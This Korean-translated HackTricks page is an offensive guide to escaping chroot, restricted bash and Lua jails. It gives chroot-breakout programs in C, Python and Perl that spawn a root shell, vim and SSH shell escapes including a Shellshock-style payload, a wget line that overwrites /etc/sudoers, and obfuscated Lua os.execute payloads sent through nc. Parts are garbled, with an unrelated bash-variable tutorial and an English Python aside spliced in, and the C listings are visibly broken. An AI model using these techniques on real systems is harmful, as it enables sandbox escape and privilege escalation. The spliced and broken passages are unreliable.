# Escaping from Jails

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)를 **팔로우**하세요.
* **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 **해킹 트릭을 공유**하세요.

</details>

## **GTFOBins**

**"Shell" 속성을 가진 이진 파일을 실행할 수 있는지 확인하려면** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **에서 검색하세요.**

## Chroot 탈출

[wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations)에서: chroot 메커니즘은 **root 권한을 가진 사용자에 의한 의도적인 조작을 방어하기 위한 것이 아닙니다**. 대부분의 시스템에서 chroot 컨텍스트는 제대로 스택되지 않으며 충분한 권한을 가진 chrooted 프로그램은 탈출을 위해 두 번째 chroot를 수행할 수 있습니다.\
일반적으로 이는 chroot 내에서 root가 되어야 탈출할 수 있다는 것을 의미합니다.

{% hint style="success" %}
**chw00t** [**도구**](https://github.com/earthquake/chw00t)는 다음 시나리오를 악용하고 `chroot`에서 탈출하기 위해 만들어졌습니다.
{% endhint %}

### Root + CWD

{% hint style="warning" %}
chroot 내에서 **root** 권한을 가지고 있다면 **다른 chroot를 생성**하여 **탈출**할 수 있습니다. 이는 2개의 chroot가 동시에 존재할 수 없기 때문에 (Linux에서) 새 폴더를 생성한 다음 **새 폴더에 새로운 chroot를 생성**하면서 **chroot 외부에 있게 되면** 이제 **새로운 chroot 외부에 있게** 됩니다.

이는 일반적으로 chroot가 작업 디렉토리를 지정한 디렉토리로 이동시키지 않기 때문에 chroot를 생성할 수 있지만 chroot 외부에 있을 수 있습니다.
{% endhint %}

일반적으로 chroot 감옥 내에서 `chroot` 이진 파일을 찾을 수 없지만 **이진 파일을 컴파일, 업로드 및 실행**할 수 있습니다:

<details>

<summary>C: break_chroot.c</summary>

\`\`\`c #include #include #include

//gcc break\_chroot.c -o break\_chroot

int main(void) { mkdir("chroot-dir", 0755); chroot("chroot-dir"); for(int i = 0; i < 1000; i++) { chdir(".."); } chroot("."); system("/bin/bash"); }

````
</details>

<details>

<summary>파이썬</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
````

</details>

<details>

<summary>펄 (Perl)</summary>

\`\`\`perl #!/usr/bin/perl mkdir "chroot-dir"; chroot "chroot-dir"; foreach my $i (0..1000) { chdir ".." } chroot "."; system("/bin/bash"); \`\`\`

</details>

### 루트 + 저장된 fd

{% hint style="warning" %}
이 경우는 이전 경우와 유사하지만, 이 경우에는 **공격자가 현재 디렉토리에 파일 디스크립터를 저장**하고, 그런 다음 **새 폴더에 chroot를 생성**합니다. 마지막으로, 그는 chroot 외부에서 해당 FD에 **접근**할 수 있으므로 **탈출**합니다.
{% endhint %}

<details>

<summary>C: break_chroot.c</summary>

\`\`\`c #include #include #include

//gcc break\_chroot.c -o break\_chroot

int main(void) { mkdir("tmpdir", 0755); dir\_fd = open(".", O\_RDONLY); if(chroot("tmpdir")){ perror("chroot"); } fchdir(dir\_fd); close(dir\_fd); for(x = 0; x < 1000; x++) chdir(".."); chroot("."); }

````
</details>

### Root + Fork + UDS (유닉스 도메인 소켓)

<div data-gb-custom-block data-tag="hint" data-style='warning'>

FD는 유닉스 도메인 소켓을 통해 전달될 수 있으므로:

* 자식 프로세스 생성 (fork)
* 부모와 자식이 대화할 수 있는 UDS 생성
* 자식 프로세스에서 다른 폴더에 chroot 실행
* 부모 프로세스에서 새로운 자식 프로세스 chroot 외부의 폴더의 FD 생성
* UDS를 사용하여 그 FD를 자식 프로세스에 전달
* 자식 프로세스는 해당 FD로 chdir하고, chroot 외부에 있기 때문에 감옥에서 탈출할 수 있음

</div>

### &#x20;Root + Mount

<div data-gb-custom-block data-tag="hint" data-style='warning'>

* 루트 장치 (/)를 chroot 내부의 디렉토리에 마운트
* 해당 디렉토리로 chroot

이것은 Linux에서 가능합니다.

</div>

### Root + /proc

<div data-gb-custom-block data-tag="hint" data-style='warning'>

* chroot 내부의 디렉토리에 procfs 마운트 (아직 마운트되지 않은 경우)
* /proc/1/root와 같이 루트/현재 작업 디렉토리 항목이 다른 pid를 찾습니다.
* 해당 항목으로 chroot

</div>

### Root(?) + Fork

<div data-gb-custom-block data-tag="hint" data-style='warning'>

* Fork(자식 프로세스)를 생성하고, FS 내부의 다른 폴더로 chroot하고 해당 폴더로 CD합니다.
* 부모 프로세스에서 자식 프로세스가 있는 폴더를 chroot 이전 폴더로 이동합니다.
* 이 자식 프로세스는 chroot 외부에서 자신을 찾을 수 있습니다.

</div>

### ptrace

<div data-gb-custom-block data-tag="hint" data-style='warning'>

* 이전에 사용자는 자신의 프로세스를 자체 프로세스에서 디버그할 수 있었습니다. 그러나 이제는 기본적으로 불가능합니다.
* 그래도 가능한 경우, 프로세스에 ptrace를 사용하여 셸코드를 실행할 수 있습니다 ([예제 참조](linux-capabilities.md#cap\_sys\_ptrace)).

</div>

## Bash 감옥

### 열거

감옥에 대한 정보 가져오기:
```bash
echo $SHELL
echo $PATH
env
export
pwd
````

#### PATH 수정

PATH 환경 변수를 수정할 수 있는지 확인합니다.

```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```

#### vim 사용하기

Vim은 강력한 텍스트 편집기로, 제한된 bash 환경에서 특권 상승을 위해 사용될 수 있습니다. 다음은 vim을 사용하여 특정 파일을 편집하는 방법입니다.

1. Vim을 실행하려면 다음 명령을 입력합니다.

```bash
vim [파일명]
```

2. Vim 편집기가 열리면 `i`를 눌러 편집 모드로 전환합니다.
3. 파일을 편집합니다.
4. 편집이 완료되면 `Esc` 키를 누르고 `:wq`를 입력하여 저장하고 종료합니다.

이제 Vim을 사용하여 제한된 bash 환경에서 파일을 편집할 수 있습니다.

```bash
:set shell=/bin/sh
:shell
```

#### 스크립트 생성

\_/bin/bash\_를 내용으로 하는 실행 가능한 파일을 생성할 수 있는지 확인합니다.

```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```

#### SSH를 통해 bash 얻기

SSH를 통해 접근하는 경우 다음 트릭을 사용하여 bash 쉘을 실행할 수 있습니다:

```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```

#### 선언

Bash에서 변수를 선언하는 방법은 다음과 같습니다:

```bash
변수명=값
```

예를 들어, 변수 `name`에 "John"이라는 값을 할당하려면 다음과 같이 작성합니다:

```bash
name=John
```

변수를 사용할 때는 `$` 기호를 사용하여 변수 값을 참조합니다. 예를 들어, `name` 변수의 값을 출력하려면 다음과 같이 작성합니다:

```bash
echo $name
```

변수를 사용하여 다른 명령어의 인수로 전달할 수도 있습니다. 예를 들어, `name` 변수의 값을 사용하여 `hello`라는 스크립트를 실행하려면 다음과 같이 작성합니다:

```bash
./hello $name
```

변수를 삭제하려면 `unset` 명령어를 사용합니다. 예를 들어, `name` 변수를 삭제하려면 다음과 같이 작성합니다:

```bash
unset name
```

```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```

#### Wget

예를 들어 sudoers 파일을 덮어쓸 수 있습니다.

```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```

#### 기타 트릭

[**https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)\
[https://pen-testing.sans.org/blog/2012/0**b**6/06/escaping-restricted-linux-shells](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells\*\*]\(https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells)\
[https://gtfobins.github.io](https://gtfobins.github.io/\*\*]\(https/gtfobins.github.io)\
**다음 페이지도 흥미로울 수 있습니다:**

### Python Jails

다음 페이지에서 파이썬 감옥에서 탈출하는 트릭을 찾을 수 있습니다:

### Lua Jails

이 페이지에서는 루아 내에서 사용할 수 있는 전역 함수를 찾을 수 있습니다: [https://www.gammon.com.au/scripts/doc.php?general=lua\_base](https://www.gammon.com.au/scripts/doc.php?general=lua\_base)

**명령 실행과 함께 평가하기:**

```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```

**점을 사용하지 않고 라이브러리의 함수를 호출하는 몇 가지 트릭**:

1. Using the `importlib` module:

```python
import importlib
mylib = importlib.import_module('mylib')
myfunc = getattr(mylib, 'myfunc')
myfunc()
```

2. Using the `__import__` function:

```python
mylib = __import__('mylib')
myfunc = getattr(mylib, 'myfunc')
myfunc()
```

3. Using the `exec` function:

```python
exec('from mylib import myfunc')
myfunc()
```

4. Using the `globals` function:

```python
globals()['myfunc'] = __import__('mylib').myfunc
myfunc()
```

These tricks allow you to call functions from a library without using the dot notation, which can be useful in certain scenarios where the dot notation is restricted or not allowed.

```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```

라이브러리의 함수 열거하기:

```bash
for k,v in pairs(string) do print(k,v) end
```

다른 lua 환경에서 이전의 원 라이너를 실행할 때마다 함수의 순서가 변경됩니다. 따라서 특정 함수를 실행해야 하는 경우 다른 lua 환경을 로드하고 le 라이브러리의 첫 번째 함수를 호출하는 브루트 포스 공격을 수행할 수 있습니다.

```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```

**대화형 lua 쉘 얻기**: 제한된 lua 쉘 내에서 새로운 lua 쉘(그리고 희망적으로 무제한 쉘)을 얻으려면 다음을 호출하십시오:

```bash
debug.debug()
```

### 참고 자료

* [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (슬라이드: [https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf))



</details>
